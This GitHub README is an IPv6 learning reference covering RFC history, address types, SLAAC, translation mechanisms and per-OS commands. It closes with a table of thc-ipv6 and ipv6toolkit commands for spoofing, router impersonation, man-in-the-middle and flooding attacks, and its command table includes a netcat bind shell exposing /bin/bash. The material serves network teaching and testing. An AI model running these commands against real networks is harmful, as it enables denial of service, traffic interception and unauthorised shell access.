![Visitor Count](https://profile-counter.glitch.me/amwalding2/count.svg)
# IPv6 Reference and Repository :round_pushpin:
Hello and Welcome!

This is my IPv6 References repository.  The goal is to provide key information regarding IPv6 of interest to anyone learning about or using IPv6.  This repository is a bunch of different stuff that I hope helps everyone is some way.
Comments are welcomed at our Discord server here: https://discord.gg/3U8q5USm
If you would like to see more content and articles like this, please support us by clicking the patron link https://www.patreon.com/cellstream?fan_landing=true where you will receive free bonus access to courses and more, or simply buying us a cup of coffee here: https://www.buymeacoffee.com/awalding !
* This README.md page - with a ton of info (see below)
* Cheat Sheets
* Packet Captures
* RFC Documents
* more

If you have anything you would like to see added, please let me know.

## :card_index:Index of Items on This Page

* [IPv6 Standards and RFC's](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-standards-and-rfcs)<br />
* [IPv6 Statistics of Interest](https://github.com/amwalding/ipv6-ref/blob/main/README.md#chart_with_upwards_trendipv6-statistics-of-interest)<br />
* [IPv6 Specific/Related/Capable Tools and Tool Sets](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-specificrelatedcapable-tools-and-tool-sets)<br />
* [Comparing IPv4 to IPv6](https://github.com/amwalding/ipv6-ref/blob/main/README.md#comparing-ipv4-to-ipv6)<br />
* [IPv6 Address Types - Prefixes/Special](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-address-types---prefixesspecial)<br />
  * [SLAAC](https://github.com/amwalding/ipv6-ref/blob/main/README.md#%EF%B8%8Fslaac---stateless-address-autoconfiguration)<br />
  * [IPv6 Address Tools](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-address-tools)<br />
  * [IPv6 Address Notes](https://github.com/amwalding/ipv6-ref/blob/main/README.md#notes-on-addressing)<br />
* [IPv6 vs. IPv4 Multicast Address Comparison Chart](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-vs-ipv4-multicast-address-comparison-chart)<br />
* [IPv6 Usage in Various OS Systems](https://github.com/amwalding/ipv6-ref/blob/main/README.md#ipv6-usage-in-various-os-systems)<br />
* [Some IPv6 Basic Networking Commands](https://github.com/amwalding/ipv6-ref/blob/main/README.md#some-ipv6-basic-networking-commands-by-os)<br />
* [Security in IPv6 Networking](https://github.com/amwalding/ipv6-ref/blob/main/README.md#locksecurity-in-ipv6-networking)<br />
  * [IPv6 Security Reading and References](https://github.com/amwalding/ipv6-ref/blob/main/README.md#notebookipv6-security-reading-and-references)<br />
  * [IPv6 Security Tools](https://github.com/amwalding/ipv6-ref/blob/main/README.md#hammer_and_wrenchipv6-security-tools)<br />
  * [IPv6 Tool Kit Command Examples](https://github.com/amwalding/ipv6-ref/blob/main/README.md#computeripv6-tool-kit-command-examples)<br />
  * [IPv6 addresses & domains Research/Investigation](https://github.com/amwalding/ipv6-ref/blob/main/README.md#magipv6-addresses--domains-researchinvestigation)<br />
  * [Domain Name System and Autonomous System Research/Investigation](https://github.com/amwalding/ipv6-ref/blob/main/README.md#magdomain-name-system-and-autonomous-system-researchinvestigation)<br />

## :link:Links to My Main Web Sites/IPv6 Repos
* The main CellStream, Inc. Web Site with tons of articles and how to's: https://www.cellstream.com
* The Online School of Network Sciences: https://www.netscionline.com (create a freee user account - lots of free References and more)
* My IPv6 Extension Header PCAPs can be found here: https://github.com/amwalding/IPv6_Extension_Header_PCAPs

## :page_with_curl:IPv6 Standards and RFCs
Referencing **Standards** is extremely important in both defining, understanding, and designing - well - anything.  When it comes to the Internet Protocols, the standards body is the Internet Engineering Task Force (the IETF).  The standards are called RFC's (Request for Comments) and these were preceded by IEN's (Internet Engineering Notes). All development of ideas and later standards can be found within these documents/specifications.

In fact, the development of IPv6 was a **bakeoff** that occured in 1995 but works began before that.  The results of this bakeoff for the next generation of the IP protocol were several proposals:
* PIP (The `P' Internet Protocol by Paul Tsuchiya: https://www.ietf.org/archive/id/draft-tsuchiya-pip-00.txt
* CATNIP (Common Address Technology for Next-Generation IP) by Robert Ullman: https://www.ietf.org/archive/id/draft-ietf-catnip-base-03.txt
* TUBA (TCP and UDP with Bigger Addresses) by Peter Ford & Mark Knopper: https://www.ietf.org/archive/id/draft-ford-ipng-tuba-whitepaper-00.txt
* SIP (Simple IP) by Steve Deering: https://www.ietf.org/archive/id/draft-deering-sip-00.txt

Steve Deering's Simple IP was selected and eventually became what we now call IPv6 - the next generation of IP.  Dr. Deering did attempt some compatibility with IPv4 in his original specification, however that is not the case today.  **IPv6 is not backwards compatible with IPv4.** While IPv4 to IPv6 translation can be done (see below), they essentially work today as "ships in the night" at Layer 3 meaning most systems run as "dual stack" supporting IPv4 and IPv6 simultaneously.  You can read more in RFC9318 where Vint Cerf points out the backwards compatibility issue in his keynote. 

I have a ZIP file in the repo called IPv6 RFCs.zip that contains all the RFC's.  I update it from time to time.  Essentially it is a complete library of the IPv6 related RFC's in TXT format in one place to save time.

To see all the IPv6 Related RFC's click here: https://www.rfc-editor.org/search/rfc_search_detail.php?page=25&title=ipv6

That said, there are some really important IPv6 RFC's I have listed below.  This filtered list simply point to the online version of the RFC at the IETF web site.

Decription/Name | URL 
------------------------------------ | ---------------------------------------------
Original Dec 1998 IPv6 Spec | https://www.rfc-editor.org/rfc/rfc2460.txt
IPv6 Addressing Architecture | https://www.rfc-editor.org/rfc/rfc4291.txt
Neighbor Discovery for IPv6 | https://www.rfc-editor.org/rfc/rfc4861.txt
IPv6 Standardization | https://www.rfc-editor.org/rfc/rfc8200.txt

## :chart_with_upwards_trend:IPv6 Statistics of Interest 
Name | URL 
------------------------------------ | ---------------------------------------------
Google | https://www.google.com/intl/en/ipv6/statistics.html :+1:
APNIC Labs | https://stats.labs.apnic.net/ipv6/ :+1:
IPv6 BPG Table | https://bgp.potaroo.net/v6/as6447/ :+1:
More IPv6 Stats | http://ipv6-test.com/stats/
Cisco | https://6lab.cisco.com/stats/
Top Alexa by country | https://www.vyncke.org/ipv6status/ :+1:
NRO | https://www.nro.net/statistics
Ripe | https://www.ripe.net/publications/ipv6-info-centre/statistics-and-tools
World IPv6 Launch | http://www.worldipv6launch.org/measurements/
M.R.P. | http://www.mrp.net/ipv6_survey/
Microsoft IPv6 page | https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd379473(v=ws.10)?redirectedfrom=MSDN

## 🛠️:IPv6 Specific/Related/Capable Tools and Tool Sets
Description/Name | URL 
------------------------------------ | ---------------------------------------------
Wireshark | https://www.wireshark.org :+1:
Use Google to test IPv6 | https://ipv6test.google.com/
Test your IPv6 Connectivity 1 | http://test-ipv6.com
Test your IPv6 Connectivity 2 | https://ipv6-test.com
Test your IPv6 Connectivity 3 | http://v6.testmyipv6.com/
Test your IPv6 Connectivity 4 | http://whatismyv6.com/
IPv6 Speed Test 1 | http://www.speedtest6.com/
IPv6 Speed Test 2 | http://ipv6-speedtest.net/
IPv6 addresses calculator | https://packages.debian.org/stable/net/ipv6calc
IPv6 Security Testing: thc-ipv6 | https://github.com/vanhauser-thc/thc-ipv6
IPv6 Security Testing: ipv6-toolkit | https://github.com/fgont/ipv6toolkit
Pinkie | http://www.ipuptime.net/pinkie/
Diagnostic tools | https://packages.debian.org/jessie/ndisc6
IPv6 DNS Lookup Tool | http://www.webdnstools.com/dnstools/dns-lookup-ipv6
Scapy | http://www.secdev.org/projects/scapy/
Chiron | http://www.secfu.net/tools-scripts/
Scanners | Nmap / Metasploit / Scan6 / Halfscan6
Online scanner | http://www.ipv6scanner.com/
Online scanner | http://www.subnetonline.com/pages/ipv6-network-tools/online-ipv6-port-scanner.php
Netcat6 | https://packages.debian.org/source/jessie/amd64/nc6
Scan detective | https://github.com/regulatre/ipv6-scan-detective
Rogue IPv6 router detector | https://github.com/xme/rrhunter
Evil foca | http://www.informatica64.com/
Firewall tester | https://github.com/timsgit/ipscan
Online Network Utilities | https://centralops.net/

## :vs:Comparing IPv4 to IPv6
Setting | IPv4 | IPv6
------------------------------------ |------------------------------------ | ---------------------------------------------
Address Length | 32 bits | 128 bits
Transmission Types | Unicast / Broadcast / Multicast | Unicast / Multicast
Neighbor Discovery | ARP | NDP, ICMPv6
Address Configuration |  Static/ICMP/DHCP | Static/ICMPv6/DHCPv6 (optional) 
ICMP | ICMPv4 | ICMPv6
Header Difference 1 | Variable Length w/Options | Fixed length (40 bytes) w/Extensions
Header Difference 2 | Header Checksum | No Header Checksum
Header Difference 3 | Protocol | Next Header
Header Difference 4 | TTL - Time to Live | Hop Limit
Header Difference 5 | Not applicable | Flow Label (generally not used) 
Fragmentation | Both in hosts and routers | Only in hosts, PMTU Discovery
Private Network Prefixes | 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 | Site Local fec0::/10, ULA fc00::/7, fd00::/8 but no translation
Loopback Address | 127.0.0.1 | ::1
Multicast Address | 224.x.y.z | FF0s::/8, where s is the scope

## :vs:IPv6 vs IPv4 Address Scopes
IPv6 introduces more clearly defined **address scopes** than IPv4, enhancing control over where packets can be delivered. Here's a concise comparison:

### IPv4 Address Scopes

IPv4 does not explicitly define address scopes, but some ranges are understood as having limited reach:

| **Scope**           | **IPv4 Example**               | **Description**                                                         |
| ------------------- | ------------------------------ | ----------------------------------------------------------------------- |
| **Host-local**      | `127.0.0.1`                    | Loopback — used for internal host communication.                        |
| **Link-local**      | `169.254.0.0/16`               | Automatic addressing when DHCP fails (APIPA); non-routable.             |
| **Private**         | `10.0.0.0/8`, `192.168.0.0/16` | Routable only within private networks.                                  |
| **Global (public)** | e.g. `8.8.8.8`                 | Globally routable on the Internet.                                      |
| **Multicast**       | `224.0.0.0 – 239.255.255.255`  | For one-to-many communication, limited in scope based on address block. |

### IPv6 Address Scopes

IPv6 explicitly defines address scopes in the protocol:

| **Scope**               | **IPv6 Prefix/Type**  | **Description**                                                                       |
| ----------------------- | --------------------- | ------------------------------------------------------------------------------------- |
| **Host-local**          | `::1`                 | Loopback — local to the host only.                                                    |
| **Link-local**          | `FE80::/10`           | Auto-configured on every interface; used for local link communication only.           |
| **Unique-local**        | `FC00::/7`            | Private addressing within an organization; like IPv4 private addresses.               |
| **Global unicast**      | `2000::/3`            | Globally routable addresses.                                                          |
| **Multicast (various)** | `FF00::/8`            | Includes scopes: interface-local, link-local, site-local, organization-local, global. |
| **Anycast**             | Not a separate prefix | Same address assigned to multiple nodes; nearest node responds.                       |

IPv6 **multicast addresses** have a defined scope field, e.g.:

* `FF02::1` — link-local all-nodes
* `FF05::2` — site-local all-routers

### Key Address Scope Differences

* **IPv6 scopes are formalized** in the protocol, enabling routers and hosts to enforce rules.
* **IPv6 uses link-local by default** for neighbor discovery and routing protocols.
* **IPv6 multicast is scoped**, unlike IPv4’s broader multicast address interpretation.

## :envelope:IPv6 Address Types - Prefixes/Special
Address Type | Binary Prefix | IPv6 Notation
------------------------------------ |------------------------------------ | ---------------------------------------------
Link-local unicast | 1111111010 | fe80::/64
Site-local unicast | 1111111011 | fec0::/10 (deprecated)
Unique local address (ULA) | 1111 110L | FC00::7 and FD00::7 
Unspecified | 00...0 (128 bits) | ::/128
Loopback | 00...1 (128 bits) | ::1/128
Multicast | 11111111 | ff00::/8
Global Unicast Address (GUA) | 0010 | 2xxx::/3 

## ⚒️:SLAAC - Stateless Address Autoconfiguration
IPv6 devices can obtain addresses through multiple methods, depending on how the network is configured.

Here are the main IPv6 address assignment methods:

🔹 1. Stateless Address Autoconfiguration (SLAAC)
The device uses Router Advertisements (RA) from routers to auto-configure its own IP address.
Combines the network prefix from the RA and a host identifier (often derived from the MAC address).

No DHCPv6 server is needed.

🔹 2. DHCPv6 (Stateful configuration)
Like IPv4 DHCP: the device gets its IP address and other info from a DHCPv6 server.
Typically used in enterprise networks that need more control.

Can be used with or without SLAAC.

🔹 3. Static Configuration
An administrator manually assigns an IPv6 address on the device.
Common in servers, routers, or special-use hosts.

🔹 4. Link-Local Addressing
All IPv6 interfaces automatically generate a link-local address (starting with fe80::) upon interface initialization.
This process happens independently of SLAAC or DHCPv6 and is required for basic IPv6 operations like routing and neighbor discovery.

The **SLAAC (Stateless Address Autoconfiguration)** process in IPv6 allows a device to automatically configure its own **globally unique IPv6 address** without needing a DHCP server.

Here’s a step-by-step breakdown of the SLAAC process:

### 🔹 1. **Link-Local Address Generation**

* The device generates a **link-local address** (prefix `fe80::/10`) using its interface MAC address (via EUI-64 or a random identifier).
* It performs **Duplicate Address Detection (DAD)** using Neighbor Solicitation to ensure it's not already in use.
* This DAD process is done for all IPv6 Addressing methods, so in a way everything starts with SLAAC.

### 🔹 2. **Router Solicitation (RS)**

* The device sends a **Router Solicitation** (RS) message to find local routers.
* Destination: `ff02::2` (all routers on the local link).

### 🔹 3. **Router Advertisement (RA)**

* A router responds with a **Router Advertisement** (RA) that includes:

  * **Network prefix** (e.g., `2001:db8:abcd::/64`)
  * Flags: **A flag (Autonomous)** and optionally the **M flag (Managed)** or **O flag (Other config)**

### 🔹 4. **Global Address Construction**

* If the **A flag is set**, the device:

  * Combines the **prefix** from the RA and a **host identifier** (based on EUI-64 or random).
  * Forms a **global unicast address** (e.g., `2001:db8:abcd::1a2b:3c4d:5e6f:7g8h`)
  * Runs **DAD again** for this address.

### 🔹 5. **Optional: DNS Configuration**

* If the **O flag** is set, the host may use **stateless DHCPv6** to get **additional info** like DNS servers.

### 🧠 Key Points:

* **"Stateless"** means routers don’t maintain state about individual clients.
* SLAAC is **lightweight** and suitable for **home or unmanaged networks**.
* It doesn’t provide everything—**DNS info often requires DHCPv6 or RDNSS options** in RA.

---

### :hammer:IPv6 Address Tools
Tool Description | Link/Reference
------------------------------------ |------------------------------------ 
Check your own GUA IPv6 Address (if you have one) | http://whatismyipv6address.com
Check out the full IPv6 Special Addresses | https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml
IPv6 Subnet Tool in Python | https://github.com/aipi/IPv6-subnet-calculator
IPv6 Subnet Calculator | https://subnetonline.com/pages/subnet-calculators/ipv6-subnet-calculator.php

### :notebook:Notes on Addressing
* Every device selects a Link-local unicast address that is unique
* Interfaces can have multiple IPv6 Addresses
* Public prefix provided either by Router Advertisement or DHCPv6
* No more need of "NAT"
* Fragmentation function removed from routers, replaced by Path MTU Discovery

## :vs:IPv6 vs. IPv4 Multicast Address Comparison Chart
IPv6 Address | Description | IPv4 Address | Description
-------------------- | ------------------------------- | -------------------- | -------------------------------
na | na  | 224.0.0.0	| Multicast Network Address (Reserved)
FF02::1	| All Nodes on Link Local	|	224.0.0.1	| All systems on the subnetwork
FF02::2	| All Routers on Link Local	|	224.0.0.2	| All Routers on the subnetwork
FF02::3	| Unassigned	|	224.0.0.3	| Unassigned
FF02::4	| DVMRP Routers	|	224.0.0.4	| DVMRP Routers
FF02::5	| All OSPF Routers	|	224.0.0.5	| All OSPF Routers
FF02::6	| ll OSPF Designated Routers	|	224.0.0.6	| All OSPF Designated Routers
FF02::7	| ST Routers	|	224.0.0.7	| ST Routers
FF02::8	| ST Hosts	|	224.0.0.8	| ST Hosts
FF02::9	| RIPv2 Routers	| 224.0.0.9	| RIPv2 Routers
FF02::A	| EIGRP Routers	|	224.0.0.10	| IGRP Routers
FF02::B	| Mobile Agents	|	224.0.0.11	| Mobile Agents
FF02::C	| DHCP Servers/Relay Agents	|	224.0.0.12	| DHCP Servers/Relay Agents
FF02::D	| All PIM Routers	|	224.0.0.13	| All PIM Routers
FF02::E	| RSVP-Encapsulation	|	224.0.0.14	| RSVP-Encapsulation

## 🛠️IPv6 / IPv4 Address Translation
There are several IPv6-to-IPv4 translation mechanisms designed to facilitate communication between IPv6-only and IPv4-only systems or networks. These methods are standardized by the IETF and can be broadly categorized into **stateless** and **stateful** mechanisms. 

### 1. Stateless Translation (SIIT - Stateless IP/ICMP Translation)

* **RFC 6145** (updated by RFC 7915)
* **How it works**: Translates IPv6 headers into IPv4 headers and vice versa without keeping any session state.
* **Use case**: Works well for one-to-one address mappings.
* **Common in**: Network edge translation (e.g., between IPv6 clients and IPv4-only servers).

### 2. NAT64

* **RFC 6146**
* **How it works**: Stateful translation that allows IPv6-only clients to access IPv4-only servers. Requires a **DNS64** service to synthesize AAAA records from A records.
* **Key component**: Maintains per-session state like classic NAT.
* **Use case**: IPv6 clients to legacy IPv4 services.
* **Common deployments**: Mobile networks, ISP core networks, enterprise edge.

### 3. 464XLAT

* **RFC 6877**
* **How it works**: Combination of:
  * **CLAT (Customer-side translator)**: Uses **SIIT** for local IPv4 apps to talk over IPv6.
  * **PLAT (Provider-side translator)**: Uses **NAT64** to access IPv4 internet.
* **Use case**: Enables IPv4-only apps on IPv6-only mobile networks.
* **Common in**: Android and iOS mobile networks.

### 4. MAP-T (Mapping of Address and Port with Translation)

* **RFC 7599**
* **How it works**: Stateless IPv6-to-IPv4 translation, supports address and port mapping.
* **Use case**: Scalable ISP deployments; avoids full NAT state tracking.

### 5. DS-Lite (Dual Stack Lite)

* **RFC 6333**
* **How it works**: Encapsulates IPv4 packets inside IPv6, IPv4 address sharing via CGNAT.
* **Not a true translation**, more of a tunneling and NAT technique.

### IPv6/IPv4 XLAT Summary:

| Method  | Type      | Key Feature                         | Direction               | Use Case                        |
| ------- | --------- | ----------------------------------- | ----------------------- | ------------------------------- |
| SIIT    | Stateless | Header translation only             | Bidirectional           | Simple IPv6 ↔ IPv4 edge use     |
| NAT64   | Stateful  | Requires DNS64, maintains state     | IPv6 → IPv4             | IPv6 clients to IPv4 servers    |
| 464XLAT | Hybrid    | SIIT (client) + NAT64 (provider)    | IPv4 apps → IPv6 → IPv4 | IPv4 apps on IPv6-only networks |
| MAP-T   | Stateless | Encodes port/address info into IPv6 | IPv6 → IPv4             | Scalable ISP deployments        |
| DS-Lite | Tunneling | IPv4-in-IPv6 + CGNAT                | IPv4 ↔ IPv4 over IPv6   | IPv4 access over IPv6 networks  |


## :computer:IPv6 Usage in Various OS Systems
Operating System | Link to Article
-------------------------------------- | ----------------------------------------------------------------------
Windows IPv6 Command Line Examples | https://www.cellstream.com/2013/09/12/ipv6-windowslinux-command-line-examples/ :+1:
MacOS IPv6 Command Line Examples | https://www.cellstream.com/2013/09/12/ipv6-osx-command-line-examples/ :+1:
GNU/Linux IPv6 Command Line Examples | https://www.cellstream.com/2013/09/12/ipv6-linux-command-line-examples/ :+1:
Neighbor Discovery (ND) Table in IPv6 Windows, Linux and macOS Machines | https://www.cellstream.com/2013/09/12/neighbor-discovery-nd-table-in-ipv6-windows-machines/
Enabling IPv6 on a Computer (Windows/Mac/Linux) | https://www.cellstream.com/2013/09/12/enabling-ipv6-on-a-computer/
Disabling IPv6 on Windows | https://www.cellstream.com/2013/09/12/disabling-ipv6-communications/
Does Starlink support IPv6? | https://www.cellstream.com/2025/05/06/does-starlink-support-ipv6/

>[!NOTE]
>Besides macOS, IPv6 is supported on iOS, ipadOS, tvOS, watchOS as well as on visionOS. The kernel that drives all those is called Darwin. In the context of Wireshark and packet capture, all Darwin-based operating systems support pcapng capture, either direclty (macOS), or via the rvi network interface (all other OSes).

## :computer:Some IPv6 Basic Networking Commands by OS
Replace IPV6ADDR with the IPv6 address in the commands below.
Replace DOMAIN with the Domain Name in the commands below.
Replace INTFC with the system name for the network interface below.

>[!NOTE]
>If you have any that I should add, please let me know.

>[!IMPORTANT]
>The best ping to test worldwide IPv6 connectivity `$ ping 2600::1` or `ping6 2600::1`  This is actually SPRINT's IPv6 address.

Action | Linux Command | macOS Command | Windows Command | Notes
------------------------------- | ----------------------------------- | --------------------------------- | ------------------------------------ | ----------------------------
Display IPv6 Settings | `$ sysctl net.ipv6` | `$ sysctl net.inet6` | | Attempt to show what IPv6 settings are present in the OS
General IP Interface Configuration 1 | `$ ifconfig` or `$ ip -6 a s INTFC` | `$ ifconfig` | `$ ipconfig` or `$ ipconfig /all` or `$ netsh interface ipv6 show addresses` | These are network interface configuration settings
General IPv6 Interface Configuration 2 | `$ ifconfig -a` or `$ cat /proc/net/if_inet6` | `$ ifconfig -a` or for a specific interface `$ ifconfig -L en0 inet6` | `$ netsh int ipv6 show global` | These are network interface configuration settings
Support for Temporary IPv6 Addresses | | `$ sysctl net.inte6 \| grep temp` | | Different OS versions support different IPv6 addressing features
Ping an IPv6 Address | `$ ping6 -I eth0 IPV6ADDR` | `$ ping6 IPV6ADDR` | `$ pathping -6 DOMAIN` | Use ICMP Ping to see if the target device is able to answer 
Domain ping | `$ ping6 -I eth0 DOMAIN` | `$ ping6 DOMAIN`| | Use ICMP Ping to see if a given domain name can be resolved and then reached
Traceroute | `$ traceroute6 DOMAIN` or `$ tracepath -n IPV6ADDR` | `$ traceroute6 DOMAIN`| `$ tracert -6 DOMAIN` | What is the path of routers to a given IPv6 destination
Traceroute EH-enabled | `$ sudo ./path6 -v -u 72 -d DOMAIN` | | | 
Traceroute with MTR | `$ mtr -6 DOMAIN` | | | 
Trace the path to discover the MTU | `$ tracepath6 DOMAIN` | | | Same as traceroute except with MTU allowed
View IPv6 Connections | `$ netstat -A inet6` | | | What IPv6 connections exist on the system
Display the Routing Table | `$ ip -6 route` or `$ netstat -rnA inet6` or `$ sudo route -A inet6` | `$ netstat -r -f inet6` | `$ route print -6` | Display the routing table of the system
Display Neighbor Discovery Cache | `$ ip -6 neigh show` | 'ndp -a' | | Display the Neighbor Discovery cach of the system (the replacement of the ARP cache)
Flush the Neighbor Discovery Cache | `$ ip -6 neigh flush` | 'ndp -c'  | | Clear the Neighbor cache to force rediscovery
Display the PMTU information | `$ ip route get IPV6ADDR` and `$ tracepath -n IPV6ADDR`| | `$ netsh interface ipv6 show destinationcache address` | Attempt to display the Path MTU information for a given destination
DNS lookup | `$ host DOMAIN` | Check DNS `$ scutil --dns \| grep nameserver \| grep "::"` Lookup: `$ dig AAAA DOMAIN` | | Looking up IPv6 DNS records
IP config | `$ ip -6 addr` or `$ sudo ifconfig {pipe} grep inet6` | | | 
IPv6 Packet Filtering | `$ sudo ip6tables -L -v --line-numbers` or `route -A inet6` | `$ netstat -r -f inet6` | `$ route print -6` or `$ netstat -r` | 
Any IPv6 Traffic? | `$ netstat -ps -6`| `netstat -s -f inet6` | `$ netstat -ps IPv6` | 
Any ICMPv6 Traffic? | | | `$ netstat -ps ICMPv6` | 
NETCAT | Listen `$ nc6 -lp 12345 -v -e "/bin/bash"` & Connect `$ nc6 localhost 12345` | | | 
SSH | `$ ssh -6 user@IPV6ADDR%eth0` | | | Using SSH in IPv6 mode
TCPDUMP | `$ sudo tcpdump -i eth0 -evv ip6` or `$ sudo tcpdum -i eth0 -evv proto ipv6` | | | 
TELNET | `$ telnet IPV6ADDR PORT` | | | 
Determining Address Type | `$ addr6 -a IPV6ADDR`  | | | Requires addr6 tool
Identifying the Flow ID generation policy | `$ sudo ./flow6 -i eth0 -v --flow-label-policy -d IPV6ADDR` | | | Requires flow6 tool

## :lock:Security in IPv6 Networking
> [!WARNING]
> The content below is provided as educational information.
> Executing some of the commands shown with certain tools installed can be considered malicious by others.
> Please use caution when using any of the information below.

I would like to start with the following statement: IPv6 should not be considered any more or less secure than IPv4.

That said, there are known vulnerabilities in IPv6 with a number of exploits.  Below are some IPv6 security references and tools.

### :notebook:IPv6 Security Reading and References
Reference Name | URL/RFC
------------------------------------ | ---------------------------------------------
IPv6 Fragmentation Attack | https://www.cellstream.com/2019/08/06/example-ipv6-frag-attack/
Example IPv6 SYN Flood Attack | https://www.cellstream.com/2019/08/05/example-ipv6-syn-flood-attack/
The Chiron IPv6 Security Assessment home on Github | https://github.com/aatlasis/Chiron
Monitoring new related IPv6 vulnerabilites | https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipv6
IPv6 attack detector | https://github.com/mzweilin/ipv6-attack-detector/ <br /> https://www.honeynet.org/node/944
Observations on the Dropping of Packets with IPv6 Extension Headers in the Real World | https://datatracker.ietf.org/doc/html/rfc7872
Rogue IPv6 Router Advertisement | https://www.rfc-editor.org/rfc/rfc6104.txt
Neighbor Discovery Problems | https://www.rfc-editor.org/rfc/rfc6583.txt
A Discard Prefix for IPv6 | https://tools.ietf.org/html/rfc6666
Network Reconnaissance in IPv6 | https://www.rfc-editor.org/rfc/rfc7707.txt

### :hammer_and_wrench:IPv6 Security Tools
>[!NOTE]
>I believe both these tool sets are standard in Parrot Linux, you can add the ipv6toolkit
>to Kali with `$ sudo apt install ipv6toolkit`

Name | Link URL
------------------------------------- | --------------------------------------------
IPv6 Security Testing: thc-ipv6 | https://github.com/vanhauser-thc/thc-ipv6
IPv6 Security Testing: ipv6-toolkit | https://github.com/fgont/ipv6toolkit
Creating IPv6 Packets: scapy | https://scapy.net <br /> https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf

### :computer:IPv6 Tool Kit Command Examples
Action | Command | Notes
-------------------------------------- | ------------------------------------------------------ | -------------------------------------------------
IPv6 implementation test | `$ sudo ./implementation6 eth0 TARGETIPv6ADDR` | Tests various IPv6 specific options for their implementations. It can also be used to test firewalls
Scan the IPv6 Network with nmap | `$ nmap -6 -sT DOMAIN` | `::1` for localhost
Domain scanning | `$ sudo ./scan6 -v -i eth0 -­d DOMAIN/64` | Scans a provided DOMAIN
Address scanning | `$ sudo ./scan6 -v -i eth0 -­d IPv6ADDR/64` | Scans a specified prefix
Local scan | `$ sudo ./scan6 -i eth0 --local-scan --rand-src-addr --verbose` | Scans for Link-local & Global addresses
Discover global IPv6 addressed devices & MAC addresses | `$ sudo ./scan6 -i eth0 -L -e --print-type global` | Scans for Global IPv6 addresses by MAC
Get IPv6 from a MAC addresses | `$ sudo ./inverse_lookup6 eth0 MACADDR` | Who has MAC Address XX:XX:XX:XX:XX:XX? Tell me your IPv6 address.
Listen for activities on local network | `$ sudo ./alive6 eth0 -v` | Detect ICMPv6 echo-reply on global addresses
Metasploit | `msf > search type:auxiliary ipv6` | Yes, this is the beginning of a deep pond, so we will just mention this
Send ICMPv6 echo-request 1 | `$ ping6 ff02::1%eth0` | All nodes address - RFC4291
Send ICMPv6 echo-request 2 | `$ ping6 ff02::2%eth0` | All Routers address - RFC4291
DAD (Duplicate Address Detection) | `$ sudo ./na6 -i eth0 --accept-src ::/128 --solicited --override --listen --verbose` or `$ sudo ./dos-new-ip6 eth0` | DAD is the mechanism of IPv6 stateless autoconfiguration to detect whether an IPv6 address exists on the network. Every time a new computer asks about IPv6 existence, the attacker replies and claims that he is that IPv6. The new computer cannot join the network since it does not have IPv6 address. It use ICMPv6 neighbor solicitation which sends to all nodes multicast address
Monitoring Duplicate Address Detection | `$ sudo ./detect-new-ip6 eth0` | Listens for new DAD announcements
Neighbor Solicitation Monitoring passively | `$ sudo ./passive_discovery6 eth0` | Just listening!
Neighbor Solicitation | `$ sudo ./flood_solicitate6 eth0 TARGETIPv6ADDR` | Flood the network with neighbor solicitations. If no target is supplied, query address will be 'ff02::1'
Neighbor Solitication Interceptor | `$ sudo ./na6 -i eth0 --accept-target TARGETIPv6ADDR --listen -E 11::33:44:55:66 --solicited --override --verbose`<br /> `$ sudo ./parasite6 -l eth0` | This redirects all local traffic to you by answering falsely to Neighbor Solitication requests
Neighbor Advertisement | `$ sudo ./flood_advertise6 eth0 TARGETIPv6ADDR` or `$ sudo ./na6 -i eth0 --target TARGETIPv6ADDR --dst-address ff02::1 --override -E 1:2:3:4:5:6 --loop --verbose` | Flood the local network with neighbor advertisements. The performance on IPv6 host neighbor tables will degrade and cause a DoS
ICMPv6 Router Discovery | `$ rdisc6 eth0` | Locates IPv6 Routers on a network segment
Router Advertisement | `$ sudo ./flood_router26 eth0` | Flood the local network with router advertisements. Many OS do not have an upper limit to the number of network a machine can belong to. All their resources can be consumed trying to join thousands of fake IPv6 networks
Router Advertisement MITM | `$ sudo ./fake_router26 eth0`<br />'fake_router26 -h' has many interesting options | Announce yourself as a router and become the default router.
RA - Advertise a malicious Current Hop Limit | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --curhop HOPS --loop 1 --verbose` | Advertise a malicious Current Hop Limit such that packets are discarded by the intervening routers
RA - Advertise a malicious MTU | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR -M MTU --loop 1 --verbose` | Advertise a small Current Hop Limit such that packets are discarded by the intervening routers
RA - Disable the existing Router | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --lifetime 0 --loop 1 --verbose` | Impersonate the local router and send a Router Advertisement with a "Router Lifetime" small value. The victim host will remove the router from the 'default routers list'
Router lifetime 0 | `$ sudo ./kill_router6 eth0 ROUTERADDR` | Router Advertisement with Router Lifetime set to 0. It announce to 'ff02:1' that a router is going down to delete it from the routing tables. '*' as router-address will sniff the network for RAs and immediately send a kill packet
TooBig error messages | `$ sudo ./ndpexhaust26 -c -r -p eth0 TARGETIPv6ADDR` | Flood the target /64 network with ICMPv6 TooBig error messages.  Perform NDP Exhaustion attacks with ICMPv6 TooBig and EchoRequest (Fortinet & Cisco sensitive from Fernando Gont test
Smurf attack | `$ sudo ./smurf6 eth0 TARGETIPv6ADDR` | Flood the target with network traffic amplification. Send ICMPv6 echo requests to 'FF02::1' with the spoofed source from the attack target
Fragments management | `$ sudo ./frag6 -i eth0 --flood-frags 10000 --loop --dst-address TARGETIPv6ADDR --verbose` or `$ sudo ./frag6 -i eth0 --flood-frags 100 --loop --src-address ::/0 --dst-address TARGETIPv6ADDR --verbose` | Flood the reassembly table with imcomplete fragment packets. Only working with poor fragment reassembly queue management
Fragmentation | `$ sudo ./frag6 -i eth0 --frag-id-policy --dst-address TARGETIPv6ADDR --verbose` | Predictable Identification values result in an information leakage that can be exploited in a number of ways like to perform a Idle-scan, DoS attacks (fragment ID collisions), uncover the rules of a number of firewalls or count the number of systems behind a middle-box for example
